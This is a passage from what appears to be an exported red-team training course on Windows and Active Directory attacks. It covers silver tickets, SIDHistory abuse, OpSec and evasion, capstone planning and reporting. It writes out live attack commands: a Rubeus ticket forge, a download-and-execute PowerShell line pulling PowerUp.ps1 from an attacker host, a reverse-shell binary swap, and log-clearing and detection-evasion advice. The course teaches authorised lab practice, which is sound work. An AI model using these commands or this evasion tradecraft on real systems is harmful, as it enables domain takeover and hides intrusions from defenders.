have Rubeus.exe accessible\n.\\Rubeus.exe silver /domain:corp.local /sid:S-1-5-21-1234567890-987654321-123456789 /target:FILESERVER01.corp.local /service:cifs /ntlm:b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5 /user:fakeuser /ptt\n</code></pre>\n<p><strong>OpSec Considerations:</strong></p>\n<ul>\n<li>Similar to Golden Tickets, injecting the ticket modifies the session and generates logs on the target server.</li>\n<li>The authentication log on the target server will show access for the user specified in <code>/user</code>, but the source machine might be unusual for that user.</li>\n<li>Obtaining the target server&#39;s hash requires administrative access on that specific server, which itself has OpSec implications (Module 2/3/4).</li>\n</ul>\n<hr>\n<h3>7.4 SIDHistory Exploitation</h3>\n<p>SIDHistory is a lesser-known vector but can be powerful in environments with a history of domain migrations or acquisitions.</p>\n<p><strong>Theory:</strong></p>\n<p>When user or group accounts are migrated from one domain to another, their original SID from the source domain can be added to the <code>sIDHistory</code> attribute of the new account in the target domain. This allows the migrated account to retain access to resources in the source domain that were ACL&#39;d using the original SID.</p>\n<p>The security principal (user or group) possessing a SID in its <code>sIDHistory</code> attribute <em>can</em> be treated by the target resource as if it were the original security principal from the source domain for access control purposes.</p>\n<p>The exploit comes when a user account in Domain A has the SID of a highly privileged group (like Domain Admins) from Domain B in its <code>sIDHistory</code>, and there is a trust relationship that allows Domain A users to access resources in Domain B. The user in Domain A might then be able to access resources in Domain B as if they were a Domain Admin <em>from Domain B</em>.</p>\n<p><strong>Prerequisites:</strong></p>\n<ul>\n<li>A trust relationship between domains.</li>\n<li>An account in one domain with the SID of a privileged group from <em>another</em> trusted domain in its <code>sIDHistory</code>.</li>\n<li>The ability to authenticate as that account.</li>\n</ul>\n<p><strong>Practical Application:</strong></p>\n<p>Exploiting SIDHistory often involves <em>creating</em> a user with a manipulated <code>sIDHistory</code> or <em>modifying</em> an existing user&#39;s <code>sIDHistory</code>. This typically requires high privileges (like Domain Admin) in the <em>source</em> domain or the ability to perform DCShadow/modify AD objects with sufficient rights.</p>\n<p>Since <em>creating</em> this condition requires high privileges anyway, the exploit itself is usually just authenticating as the manipulated user and accessing resources in the trusted domain. The key is <em>identifying</em> existing accounts with potentially exploitable SIDHistory.</p>\n<ol>\n<li><strong>Identify Accounts with SIDHistory:</strong> Use AD enumeration tools.<pre><code class=\"language-powershell\"># Using PowerView (from PowerSploit)\nGet-DomainUser -Properties SIDHistory | Where-Object {$_.SIDHistory -ne $null} | Select-Object Name, SIDHistory\n\nGet-DomainGroup -Properties SIDHistory | Where-Object {$_.SIDHistory -ne $null} | Select-Object Name, SIDHistory\n</code></pre>\n</li>\n<li><strong>Analyze SIDHistory:</strong> Look at the SIDs listed. Try to identify the domain and the original account/group the SID belongs to. Use resources like <code>addam.py</code> from Impacket or online SID lookups to identify common well-known SIDs (like Domain Admins). If you see a SID corresponding to a privileged group from a trusted domain, you&#39;ve found a potential vector.</li>\n<li><strong>Leverage the Account:</strong> If you have the credentials for an account with an interesting SIDHistory, simply authenticate as that user (e.g., via <code>runas /netonly</code>, PsExec, or Pass-the-Hash if you have the hash) and attempt to access resources in the domain corresponding to the SID in the history.</li>\n</ol>\n<p><strong>Creating SIDHistory (Requires High Privileges):</strong></p>\n\n                </div>\n             </div>\n         ",
    "module-8": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 8: module_8</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team! We&#39;ve traversed the intricate pathways of Windows internals, harvested precious credentials, scaled local privileges, danced across the network, and mapped the hidden relationships within Active Directory. Now, we arrive at the culmination ‚Äì Module 8.</p>\n<p>This isn&#39;t just a wrap-up; it&#39;s where we synthesize everything. We stop thinking about individual techniques and start thinking like a cohesive red team operator. We&#39;ll focus on the crucial, often overlooked, aspects: <em>Operational Security (OpSec)</em> to stay undetected, the <em>Planning</em> that makes an operation efficient, the <em>Execution</em> where theory meets reality, and the <em>Reporting</em> that translates our technical feats into actionable intelligence for defenders.</p>\n<p>This module is designed around the <strong>Capstone Project</strong>. Your journey through Modules 1-7 has equipped you with the tools and knowledge. Now, you&#39;ll apply them end-to-end in a simulated operation. Think of this as your final exam, but one where you get to write the questions (your plan) and show your work (your execution and report).</p>\n<p>Let&#39;s dive into the final, critical pieces of the puzzle!</p>\n<hr>\n<h2>Module 8: Operational Security (OpSec), Reporting &amp; Capstone Project</h2>\n<p><strong>Module Objective:</strong> Understand and apply OpSec principles throughout the operation, synthesize all learned techniques, plan a simulated red team engagement, execute it in the lab, and document the process and findings.</p>\n<p><strong>Duration:</strong> This module is primarily driven by the Capstone Project, which will require significant hands-on lab time. Allocate time for planning (several hours), execution (potentially several hours spread out), and reporting (several hours).</p>\n<hr>\n<h3>Section 8.1: Operational Security (OpSec) - The Art of Not Getting Caught</h3>\n<p>Welcome to the shadowy world of OpSec. While gaining access and escalating privileges is exciting, doing it stealthily is what separates a noisy script kiddie from a professional red teamer. OpSec is about minimizing your footprint, blending in, and understanding how defenders see the world.</p>\n<p><strong>Why OpSec Matters:</strong></p>\n<ul>\n<li><strong>Real Engagements:</strong> Getting caught early means mission failure. It burns your tools, techniques, and procedures (TTPs).</li>\n<li><strong>Lab Environment:</strong> Even in a lab, practicing good OpSec helps you understand <em>why</em> certain techniques are better than others and prepares you for real-world constraints. It forces you to think like a defender trying to catch you.</li>\n</ul>\n<h4>8.1.1 Reviewing OpSec by Phase</h4>\n<p>Let&#39;s revisit the stages we&#39;ve covered and highlight OpSec considerations at each step:</p>\n<ul>\n<li><strong>Initial Access (Assumed):</strong> While we started <em>after</em> initial access, the methods <em>used</em> for initial access (phishing, exploit, weak RDP, etc.) have huge OpSec implications. A loud exploit might trigger immediate alerts, while a carefully crafted phishing email with a subtle payload might go unnoticed longer.</li>\n<li><strong>Module 1: Initial Host Reconnaissance:</strong><ul>\n<li><strong>Risk:</strong> Running noisy commands (<code>systeminfo</code>, <code>tasklist</code>, <code>netstat</code>) frequently or in rapid succession can look suspicious, especially if logged. Using standard binaries is generally better than dropping custom tools early.</li>\n<li><strong>OpSec Tip:</strong> Use native commands where possible. Space out your commands. Understand what commands are <em>expected</em> on that system (e.g., a sysadmin might run <code>tasklist</code>, but maybe not every 5 minutes).</li>\n</ul>\n</li>\n<li><strong>Module 2: Local Enumeration &amp; Credential Harvesting:</strong><ul>\n<li><strong>Risk:</strong> Accessing sensitive files/registry keys, dumping LSASS. Duming LSASS is <em>highly</em> suspicious and often a prime detection vector for EDR/AV. Running unknown executables (<code>procdump</code>, <code>Mimikatz</code> variants) is also risky.</li>\n<li><strong>OpSec Tip:</strong> Use fileless techniques (PowerShell scripts loaded directly into memory). Use trusted/signed binaries if available (though attackers use these too!). Understand <em>how</em> tools like Mimikatz work (<code>sekurlsa::logonpasswords</code>) and what system calls they make, as defenders look for those specific calls. Consider <em>offline</em> analysis if you can exfiltrate memory dumps or registry hives without touching LSASS directly on the target.</li>\n</ul>\n</li>\n<li><strong>Module 3: Windows Privilege Escalation:</strong><ul>\n<li><strong>Risk:</strong> Creating new services, dropping exploit binaries, modifying registry keys, using known vulnerable kernel exploits. UAC bypasses might trigger specific EDR rules.</li>\n<li><strong>OpSec Tip:</strong> Leverage misconfigurations that <em>don&#39;t</em> require dropping files (e.g., weak service permissions you can modify in place). Use reflective DLL injection or in-memory PE techniques. Understand the detection surface of common PE tools (<code>PowerUp</code>, <code>WinPEAS</code>) and consider manually replicating steps or using less common variants.</li>\n</ul>\n</li>\n<li><strong>Module 4: Lateral Movement:</strong><ul>\n<li><strong>Risk:</strong> Using noisy tools like PsExec (sysinternals version is often flagged), high volume of failed authentication attempts, using unexpected protocols (WMI, PowerShell Remoting) between unusual hosts, creating scheduled tasks remotely.</li>\n<li><strong>OpSec Tip:</strong> Blend in. Use protocols <em>expected</em> between systems (e.g., RDP for admin access, SMB for file shares). Use credentials you&#39;ve harvested via PtH/PtT rather than brute-forcing. Use in-memory execution frameworks (like Covenant, Empire, Metasploit) that handle lateral movement tasks more stealthily than dropping raw executables. Use <code>Invoke-Command</code> or <code>Enter-PSSession</code> with appropriate credentials if PowerShell Remoting is common in the environment.</li>\n</ul>\n</li>\n<li><strong>Module 5: Active Directory Enumeration:</strong><ul>\n<li><strong>Risk:</strong> High volume of LDAP/S queries from a single host, especially from an unusual user or machine. Running BloodHound collectors (<code>SharpHound</code>, <code>PowerHound</code>) can be noisy due to the sheer volume of queries they make.</li>\n<li><strong>OpSec Tip:</strong> Use native tools (<code>net group /domain</code>, <code>nltest</code>) sparingly first. Use less noisy AD enumeration techniques if possible. Run BloodHound collectors from a system that is less monitored or blend the collection activity over a longer period. Understand <em>what</em> queries BloodHound makes so you know what defenders might see.</li>\n</ul>\n</li>\n<li><strong>Module 6: Advanced Credential Attacks:</strong><ul>\n<li><strong>Risk:</strong> Kerberoasting (requesting many SPN tickets from a DC can be detected, especially if done from a non-server OS), AS-REP Roasting (failed pre-authentication attempts logged on the DC), PtH/PtT (using tickets/hashes from unusual source IPs). Using tools like Mimikatz/Rubeus on target systems.</li>\n<li><strong>OpSec Tip:</strong> Perform Kerberoasting from a less critical host. Be mindful of the number of requests. Perform offline cracking <em>off</em> the target network. Use PtH/PtT carefully, ensuring the source/destination combination doesn&#39;t look anomalous. Use in-memory versions of tools like Rubeus via PowerShell.</li>\n</ul>\n</li>\n<li><strong>Module 7: Domain Dominance &amp; Persistence:</strong><ul>\n<li><strong>Risk:</strong> Modifying sensitive AD objects (users, groups, GPOs, AdminSDHolder), using highly suspicious techniques like DCSync or DCShadow (these look like domain controllers replicating!). Creating persistent backdoors (scheduled tasks, services, WMI permanent events, modifying logon scripts, etc.).</li>\n<li><strong>OpSec Tip:</strong> Understand what is being monitored on Domain Controllers (Event IDs related to object modification, replication, logon/logoff). Use techniques that blend in (e.g., modifying an <em>existing</em> GPO subtly rather than creating a new one). Use less common persistence methods. Be <em>extremely</em> cautious with DCSync/DCShadow ‚Äì these are often considered high-risk techniques likely to trigger alerts.</li>\n</ul>\n</li>\n</ul>\n<h4>8.1.2 Common Detection Mechanisms</h4>\n<p>Defenders use various tools and techniques to spot malicious activity. Understanding these helps you evade them.</p>\n<ol>\n<li><strong>Endpoint Detection and Response (EDR) / Antivirus (AV):</strong><ul>\n<li><strong>What they see:</strong> Malicious file hashes, suspicious process behavior (e.g., a standard user process accessing LSASS memory), unusual parent-child process relationships (e.g., <code>cmd.exe</code> spawning <code>powershell.exe</code> with encoded commands), modifications to critical system areas (registry, startup folders), known exploit patterns.</li>\n<li><strong>Evasion thought:</strong> Use fileless execution, process injection, obfuscate scripts, use Living Off The Land Binaries/Scripts (LOLBAS - using legitimate system tools for malicious purposes, like <code>certutil</code> for decoding files, <code>powershell</code> for execution, <code>bitsadmin</code> for downloads).</li>\n</ul>\n</li>\n<li><strong>Network Monitoring (IDS/IPS, Network Traffic Analysis):</strong><ul>\n<li><strong>What they see:</strong> Connections to known bad IPs, high volume of traffic on unusual ports (e.g., SMB traffic from a workstation to another workstation that isn&#39;t normally a file server), scanning activity, suspicious protocol usage (e.g., NTLM authentication attempts with old hashes, Kerberos service ticket requests for many SPNs).</li>\n<li><strong>Evasion thought:</strong> Use encrypted channels (HTTPS C2), tunnel traffic, blend in with normal traffic patterns, minimize scanning, use credentials/hashes via PtH/PtT instead of brute force.</li>\n</ul>\n</li>\n<li><strong>Logging and Security Information and Event Management (SIEM):</strong><ul>\n<li><strong>What they see:</strong> This is the defender&#39;s primary source of truth. Windows Event Logs (Security, System, Application), Sysmon logs (highly detailed process, network, file activity), Domain Controller logs (authentication events, object modifications, replication). SIEMs correlate these logs to spot patterns (e.g., failed login attempts followed by a successful login from a different user/IP, a user account logging into multiple machines in a short time, unusual service installations).</li>\n<li><strong>Evasion thought:</strong> Understand critical Event IDs (e.g., 4624/4625 Logon/Logoff, 4688 Process Creation, 4720 User Created, 4732 Group Membership Added). Avoid generating excessive failed events. Be cautious with log clearing (<code>wevtutil cl system</code> etc.) as clearing logs <em>itself</em> generates a log event (Event ID 1102)! Focus on techniques that generate <em>fewer</em> or <em>less suspicious</em> log entries. Sysmon is a pain for attackers; understanding its configuration is key.</li>\n</ul>\n</li>\n</ol>\n<h4>8.1.3 Evasion Techniques &amp; Tradecraft</h4>\n<p>Beyond specific tool usage, OpSec is a mindset and a set of practices:</p>\n<ul>\n<li><strong>Living Off The Land (LOTL):</strong> Use legitimate system tools (PowerShell, WMI, schtasks, bitsadmin, etc.) as much as possible instead of dropping custom malware. This makes your activity look more like legitimate system administration.</li>\n<li><strong>Fileless Techniques:</strong> Execute payloads directly in memory (e.g., PowerShell scripts via <code>IEX</code>, reflective DLL injection) to avoid writing malicious files to disk, which AV/EDR often monitor.</li>\n<li><strong>Obfuscation:</strong> Encode or obfuscate scripts and commands to make them harder for static analysis (AV signatures) and defenders to read (<code>powershell -encodedcommand ...</code>).</li>\n<li><strong>Timing:</strong> Perform actions during off-hours or maintenance windows when activity might be expected or monitoring staff are less vigilant (though automated alerting should still catch you!).</li>\n<li><strong>Tooling:</strong> Use reputable red team frameworks (Covenant, Empire, Metasploit, PoshC2) that implement better OpSec practices (encrypted C2, in-memory execution, less signatured payloads) than raw tools. Understand the OpSec profile of your tools ‚Äì Mimikatz is loud, but essential; use it judiciously.</li>\n<li><strong>User Simulation:</strong> Try to make your activity look like a legitimate user or administrator on the network. Access expected resources, use expected protocols.</li>\n<li><strong>C2 Communications:</strong> Use encrypted channels (HTTPS is common) and potentially domain fronting or compromised legitimate domains to masquerade command and control traffic.</li>\n</ul>\n<p><strong>OpSec is a constant cat-and-mouse game.</strong> Defenders improve, and attackers adapt. Staying current on detection methods is crucial for effective red teaming.</p>\n<h3>Section 8.2: Planning a Red Team Operation (Capstone Phase 1)</h3>\n<p>Before you touch a single key in the lab for your Capstone, you <em>must</em> plan. A good plan saves time, reduces noise, and increases your chances of success.</p>\n<h4>8.2.1 Why Plan?</h4>\n<ul>\n<li><strong>Clarity of Purpose:</strong> What are you trying to achieve? (The objective).</li>\n<li><strong>Efficiency:</strong> Avoid wasted steps or going down rabbit holes.</li>\n<li><strong>Risk Management:</strong> Understand the potential detection points and have contingencies.</li>\n<li><strong>Team Coordination (Real World):</strong> Ensures everyone is on the same page and not stepping on each other&#39;s toes.</li>\n<li><strong>Measurability:</strong> How do you know you succeeded?</li>\n</ul>\n<h4>8.2.2 Key Planning Elements</h4>\n<ol>\n<li><p><strong>Define Objectives:</strong> This is the <em>goal</em> of the operation. For your Capstone, choose something specific and achievable within your lab environment. Examples:</p>\n<ul>\n<li>Obtain Domain Administrator privileges.</li>\n<li>Access a specific sensitive file share (e.g., <code>\\\\DC01\\HR_Data</code>).</li>\n<li>Establish persistent access on the Domain Controller.</li>\n<li>Compromise a specific user&#39;s mailbox or cloud storage (if simulated).</li>\n<li>Exfiltrate a specific &quot;sensitive&quot; file.</li>\n<li>Establish persistence on at least 3 different machines in the network.</li>\n</ul>\n<p><em>Write down your objective clearly.</em></p>\n</li>\n<li><p><strong>Define Scope:</strong> What systems, subnets, user accounts, or applications are <em>in bounds</em> for this operation? In your lab, this might be &quot;all machines in the <code>CONTOSO.COM</code> domain&quot; or &quot;only systems on the 192.168.1.0/24 subnet&quot;. <em>Write down your scope.</em></p>\n</li>\n<li><p><strong>Define Rules of Engagement (RoE):</strong> In a real engagement, this is critical and covers things like: Are DoS attacks allowed? Can we target specific individuals? What hours can we operate? What is the &quot;get out of jail free&quot; card if we&#39;re caught? In your lab, this is simpler, but still good practice:</p>\n<ul>\n<li>Are you allowed to modify system configurations permanently (except for persistence objectives)?</li>\n<li>Are you allowed to shut down systems? (Probably not).</li>\n<li>What is the starting point (the &quot;initial access&quot; context)? (e.g., &quot;You have a low-priv shell on WKSTN1&quot;).</li>\n</ul>\n<p><em>Define simple RoE for your lab.</em></p>\n</li>\n</ol>\n<h4>8.2.3 Intelligence Gathering &amp; Attack Path Mapping</h4>\n<p>This is where you leverage the skills from Modules 1-5, especially Module 5 (AD Enumeration and BloodHound).</p>\n<ul>\n<li><strong>Review your AD Data:</strong> Look at the BloodHound graph, your PowerView output, your <code>net</code> command results.</li>\n<li><strong>Identify High-Value Targets:</strong> Who are the Domain Admins? Where do they log in? What systems are critical?</li>\n<li><strong>Map Potential Paths:</strong> Use BloodHound queries or manually trace connections/privileges:<ul>\n<li>Shortest path from your starting point (initial access host/user) to your objective.</li>\n<li>Identify users or groups with excessive privileges.</li>\n<li>Find systems with potential misconfigurations (e.g., unconstrained delegation).</li>\n<li>Locate users vulnerable to credential attacks (Kerberoastable, AS-REP Roasting).</li>\n</ul>\n</li>\n<li><strong>Identify Choke Points:</strong> Are there systems or users that, if compromised, open up many paths?</li>\n</ul>\n<h4>8.2.4 Strategy Development</h4>\n<p>Based on your objective, scope, RoE, and intelligence, outline your plan. This isn&#39;t just a list of tools; it&#39;s a sequence of actions.</p>\n<ol>\n<li><strong>Starting Point:</strong> Where are you beginning? (e.g., Low-priv user <code>user.low</code> on <code>WKSTN1</code>).</li>\n<li><strong>Phase 1: Initial Foothold &amp; Local Recon:</strong> What commands/scripts will you run immediately to understand the local host? (<code>whoami</code>, <code>ipconfig</code>, <code>tasklist</code>, basic file checks). OpSec consideration: Use native tools first.</li>\n<li><strong>Phase 2: Local Enumeration &amp; PE:</strong> How will you look for local PE vectors? (<code>PowerUp</code>, <code>WinPEAS</code>, manual checks). What&#39;s your primary PE target? What&#39;s your backup? OpSec consideration: Use in-memory techniques if possible.</li>\n<li><strong>Phase 3: Credential Harvesting:</strong> How will you attempt to get credentials from the initial host <em>after</em> achieving local admin? (e.g., <code>Invoke-Mimikatz</code> via reflective PowerShell, dumping SAM/SECURITY hives). OpSec consideration: Dumping LSASS is high risk; prioritize other methods if feasible initially.</li>\n<li><strong>Phase 4: AD &amp; Network Recon:</strong> How will you gather more AD info from your new privileged shell? (<code>PowerView</code>, <code>SharpHound</code>). OpSec consideration: Run collectors carefully, consider timing.</li>\n<li><strong>Phase 5: Attack Path Execution &amp; Lateral Movement:</strong> Based on BloodHound/AD data, what&#39;s your <em>chosen</em> path to the objective? (e.g., User <code>svc_sql</code> is Kerberoastable -&gt; Crack hash -&gt; <code>svc_sql</code> is admin on <code>APP01</code> -&gt; PsExec to <code>APP01</code> -&gt; <code>APP01</code> has cached creds for <code>admin.da</code> -&gt; PtH to DC). List the specific lateral movement techniques you plan to use for each hop. OpSec consideration: Which LM methods are less noisy?</li>\n<li><strong>Phase 6: Reaching the Objective:</strong> What are the final steps? (e.g., If objective is DA, it might be <code>PtH</code> to the DC&#39;s <code>krbtgt</code> hash to forge a Golden Ticket).</li>\n<li><strong>Phase 7: Persistence (If objective includes it):</strong> How will you maintain access? (e.g., Create a scheduled task, modify a GPO, DCSync a backup DA account). OpSec consideration: Choose a persistence method least likely to be found.</li>\n<li><strong>Phase 8: Cleanup (Lab context):</strong> Revert VMs.</li>\n</ol>\n<p><em>Create a flowchart or detailed step-by-step list of your planned actions.</em> Include the <em>expected</em> tools/commands for each step. Have backup plans if a step fails.</p>\n<h3>Section 8.3: Execution (Capstone Phase 2)</h3>\n<p>This is where you put your plan into action in the lab environment.</p>\n<p><strong>Key Principles:</strong></p>\n<ul>\n<li><strong>Follow Your Plan:</strong> Start by executing the steps you outlined.</li>\n<li><strong>Document <em>Everything</em>:</strong> This is CRITICAL for your report. Don&#39;t just run commands; record them.</li>\n<li><strong>Be Flexible:</strong> Your plan <em>will</em> encounter unexpected issues. Systems might be configured differently, tools might fail, techniques might not work. Be ready to troubleshoot and adapt your plan on the fly using your knowledge from M1-7.</li>\n<li><strong>Practice OpSec:</strong> Be mindful of the noise you&#39;re making, even in the lab. If you planned a stealthy approach, stick to it.</li>\n<li><strong>Verify Each Step:</strong> Did the PE succeed? Did the lateral movement work? Did you get the credentials?</li>\n</ul>\n<h4>8.3.1 Step-by-Step Execution &amp; Documentation</h4>\n<p>This is the most important part of the execution phase for the Capstone. You need to capture <em>exactly</em> what you did.</p>\n<p><strong>Recommended Documentation Method:</strong></p>\n<p>Maintain a running log as you work. A simple text file, a Markdown file, or a tool like OneNote works well. For each action:</p>\n<ol>\n<li><strong>Timestamp:</strong> When did you perform the action?</li>\n<li><strong>Host:</strong> Which system are you currently operating on?</li>\n<li><strong>User Context:</strong> What user are you running as? (e.g., <code>low-priv-user</code>, <code>NT AUTHORITY\\SYSTEM</code>).</li>\n<li><strong>Action/Command:</strong> What did you do? (e.g., &quot;Attempting PE using Service X vulnerability&quot;, <code>powershell -ep bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://attacker_ip/PowerUp.ps1&#39;); Invoke-AllChecks&quot;</code>)</li>\n<li><strong>Result:</strong> What happened? Was it successful? Did it fail? What was the output? (Include command output or screenshots).</li>\n<li><strong>Analysis/Notes:</strong> What does this result tell you? What&#39;s the next step based on this? Did you deviate from the plan and why?</li>\n</ol>\n<p><strong>Example Log Snippet:</strong></p>\n<pre><code class=\"language-markdown\">---\n### Capstone Execution Log - Objective: Obtain DA\n\n**Starting Point:** Low-priv user `user.low` on `WKSTN1`.\n\n**[2023-10-27 10:05:00]**\n**Host:** WKSTN1\n**User:** CONTOSO\\user.low\n**Action:** Initial recon - check basic system info.\n**Command:** `systeminfo`\n**Result:** Output shows Windows 10 Pro, build xxxx. Domain joined to CONTOSO.COM. Patch level seems relatively recent.\n**Notes:** System is Windows 10. Need to identify specific build/missing patches later if kernel exploit is considered.\n\n**[2023-10-27 10:07:30]**\n**Host:** WKSTN1\n**User:** CONTOSO\\user.low\n**Action:** Check running processes for interesting targets or potential PE vectors.\n**Command:** `tasklist /svc`\n**Result:** Output lists services and their PIDs. See &#39;VulnerableService.exe&#39; running with PID 1234. Looks suspicious.\n**Notes:** Investigate &#39;VulnerableService.exe&#39;. Check its path and permissions.\n\n**[2023-10-27 10:15:00]**\n**Host:** WKSTN1\n**User:** CONTOSO\\user.low\n**Action:** Check permissions on &#39;VulnerableService.exe&#39; path.\n**Command:** `icacls &quot;C:\\Program Files\\Vulnerable Service&quot;`\n**Result:** Output shows &#39;BUILTIN\\Users:(F)&#39;. Full control for standard users! This is a PE vector.\n**Notes:** Plan changed: Pursue vulnerable service PE. Will attempt to replace the service binary.\n\n**[2023-10-27 10:20:00]**\n**Host:** WKSTN1\n**User:** CONTOSO\\user.low\n**Action:** Attempting to replace VulnerableService.exe with malicious binary (meterpreter shell reverse tcp, rename to VulnerableService.exe).\n**Command:** `copy C:\\Users\\user.low\\Desktop\\evil.exe &quot;C:\\Program Files\\Vulnerable Service\\VulnerableService.exe&quot;`\n**Result:** Copy successful!\n**Notes:** Now need to restart the service.\n\n**[2023-10-27 10:21:00]**\n**Host:** WKSTN1\n**User:** CONTOSO\\user.low\n**Action:** Restarting VulnerableService.\n**Command:** `sc stop VulnerableService` then `sc start VulnerableService`\n**Result:** Service stopped and started successfully. Attacker listener received connection! Got SYSTEM shell.\n**Notes:** PE successful via vulnerable service binary replacement. Now at `NT AUTHORITY\\SYSTEM` on WKSTN1. Proceed to M2/M6 techniques for cred harvesting as SYSTEM.\n---\n</code></pre>\n<p>This level of detail is crucial. It allows you to reconstruct your steps for the report and understand where things went right or wrong.</p>\n<h3>Section 8.4: Post-Operation (Capstone Phase 3)</h3>\n<p>In a real red team engagement, this phase involves:</p>\n<ul>\n<li><strong>Cleanup:</strong> Removing persistence mechanisms, deleting tools/scripts dropped on disk, clearing logs (carefully, and often leaving traces anyway), removing any created accounts or objects.</li>\n<li><strong>Verification:</strong> Double-checking that the objective was definitively met.</li>\n<li><strong>Knowledge Transfer:</strong> Briefing the client defenders (often done as part of the report).</li>\n</ul>\n<p>In your lab Capstone:</p>\n<ul>\n<li><strong>Cleanup:</strong> The easiest way is often to revert your lab VMs to a clean state before the operation. If you created persistence, <em>manually</em> go back and remove it as a practice exercise.</li>\n<li><strong>Verification:</strong> Ensure you have undeniable proof that you achieved your objective (e.g., screenshot of a Domain Admin shell, screenshot accessing the sensitive file share from your compromised path).</li>\n</ul>\n<h3>Section 8.5: Documentation &amp; Reporting (Capstone Phase 4)</h3>\n<p>This is where you synthesize your execution log and findings into a coherent report. A good report is arguably as important as the successful execution itself. It&#39;s how you communicate value and help the defenders improve.</p>\n<h4>8.5.1 Why Good Reporting Matters</h4>\n<ul>\n<li><strong>Communication:</strong> Translates technical actions into understandable impact.</li>\n<li><strong>Actionable Intelligence:</strong> Provides defenders with concrete findings and recommendations to fix vulnerabilities.</li>\n<li><strong>Demonstrates Value:</strong> Shows the client/management what was achieved and the security posture from an attacker&#39;s perspective.</li>\n<li><strong>Knowledge Transfer:</strong> Educates the defense team on attacker TTPs.</li>\n</ul>\n<h4>8.5.2 Target Audiences</h4>\n<ul>\n<li><strong>Executive Summary:</strong> High-level overview for management. Focus on the objective, whether it was achieved, the overall risk demonstrated, and key recommendations. <em>Non-technical language.</em></li>\n<li><strong>Technical Details:</strong> For the security team and system administrators. Detailed steps, specific vulnerabilities, affected systems, tools used, evidence. <em>Technical language.</em></li>\n</ul>\n<h4>8.5.3 Report Structure</h4>\n<p>A standard structure is often used:</p>\n<ol>\n<li><strong>Executive Summary:</strong> (1-2 pages)<ul>\n<li>Objective of the engagement.</li>\n<li>Summary of findings and overall risk.</li>\n<li>Confirmation of whether the objective was met.</li>\n<li>Key recommendations.</li>\n</ul>\n</li>\n<li><strong>Scope and Objectives:</strong><ul>\n<li>Clearly state what was in scope (systems, network ranges).</li>\n<li>Reiterate the specific objectives.</li>\n<li>Mention any RoE or constraints.</li>\n</ul>\n</li>\n<li><strong>Methodology:</strong><ul>\n<li>Briefly describe the approach taken (e.g., simulated initial access, focus on AD environment).</li>\n<li>Mention the phases of the operation (recon, PE, LM, etc.).</li>\n</ul>\n</li>\n<li><strong>Findings:</strong><ul>\n<li>This is the core technical section. Organize logically.</li>\n<li>Common organization methods:<ul>\n<li>By kill chain phase (Recon Findings, PE Findings, LM Findings, etc.)</li>\n<li>By severity (Critical, High, Medium, Low)</li>\n<li>By system/group of systems</li>\n</ul>\n</li>\n<li>For <em>each</em> finding (e.g., &quot;Weak Service Permissions on WKSTN1&quot;, &quot;Kerberoastable User Account&quot;, &quot;Unconstrained Delegation on APP01&quot;):<ul>\n<li><strong>Title:</strong> Clear and concise.</li>\n<li><strong>Description:</strong> Explain the vulnerability/misconfiguration.</li>\n<li><strong>Location:</strong> Where was it found (Host, User, AD Object)?</li>\n<li><strong>Impact:</strong> How could an attacker leverage this? (e.g., &quot;Allows local privilege escalation&quot;, &quot;Grants access to crackable hash&quot;, &quot;Allows impersonation of any service&quot;).</li>\n<li><strong>Proof of Concept/Steps to Reproduce:</strong> This is where your execution log comes in! Detail the steps taken to identify and exploit it. Include commands, relevant output, and screenshots as evidence. <em>Example:</em> &quot;Step 1: Ran `icacls &quot;C:\\Program Files\\Vulnerable</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n\n                </div>\n             </div>\n         "
  },
  "sidebarOverview": "\n         <div class=\"card course-progress-card\">\n             <h3>Course Progress</h3>\n             <!-- Progress bar placeholder -->\n             <div class=\"progress-bar-container\">\n                 <div class=\"progress-bar\" style=\"width: 0%;\"></div>\n             </div>\n             <p>0% Complete</p>\n             <p>0/8 modules completed</p>\n             <button>Continue Learning</button>\n         </div>\n         <div class=\"card\">\n             <h3>What You'll Learn</h3>\n             <div class=\"markdown-content text-center\"> <p>Coming Soon</p>\n </div> <!-- Placeholder Coming Soon -->\n         </div>\n         <div class=\"card\">\n             <h3>Requirements</h3>\n              <div class=\"markdown-content text-center\"> <p>Coming Soon</p>\n </div> <!-- Placeholder Coming Soon -->\n         </div>\n     ",
  "rawModules": [
    {
      "title": "module_1",
      "description": "module_1 Overview",
      "order": 1,
      "content": "Alright team, let's kick this off! I'm genuinely stoked to guide you through the fascinating world of Windows and Active Directory red teaming. Forget dry lectures; we're here to build practical skills, understand the attacker's perspective, and frankly, have some fun breaking things in a controlled, ethical environment.\r\n\r\nThis first module is our foundational step. Think of it like landing on a new planet ‚Äì you've arrived (initial access achieved!), but you have *no idea* what's around you. Your immediate goal isn't to conquer the planet, but to figure out: Where are you? What resources are available? Who else is here? What's the lay of the land?\r\n\r\nThat's exactly what initial host reconnaissance is about. We'll focus on using the tools *already present* on the system. Why? Because they're expected, often less noisy than dropping custom binaries, and surprisingly powerful once you know how to wield them.\r\n\r\nLet's dive in!\r\n\r\n---\r\n\r\n## **Module 1: Post-Exploitation Foundations & Initial Host Reconnaissance**\r\n\r\n**Module Objective:** Understand the red team lifecycle's post-exploitation phase and perform comprehensive initial reconnaissance on a compromised Windows host using native tools and fundamental techniques.\r\n\r\n**Alright, so you've got a shell... now what?**\r\n\r\nThis module assumes you've already gained some form of initial access to a Windows machine. This could be anything from an RDP session with stolen credentials, a web shell on a vulnerable application, successful exploitation leading to a reverse shell, or even physical access (though less common in pure \"red team\" simulations unless specified).\r\n\r\nThe *point* is, you are *on* the system, but likely with limited knowledge of your surroundings. This is where the \"Post-Exploitation\" phase begins.\r\n\r\n### **1.1 Revisiting the Red Team/Attack Kill Chain (Focus on Actions on Objective)**\r\n\r\nYou've probably seen variations of the cyber kill chain or attack lifecycle. They generally follow a path:\r\n\r\n1.  **Reconnaissance:** Gathering information about the target *before* interacting with it.\r\n2.  **Weaponization:** Pairing an exploit with a backdoor/payload.\r\n3.  **Delivery:** Getting the weaponized payload to the target (phishing, vulnerable service, etc.).\r\n4.  **Exploitation:** Triggering the vulnerability to run your code.\r\n5.  **Installation:** Establishing a persistent foothold.\r\n6.  **Command and Control (C2):** Communicating with your implanted code.\r\n7.  **Actions on Objective:** *This is where we are right now.* This is the phase where the attacker performs actions to achieve their *actual goal* ‚Äì whether it's data exfiltration, disruption, gaining domain admin, or something else 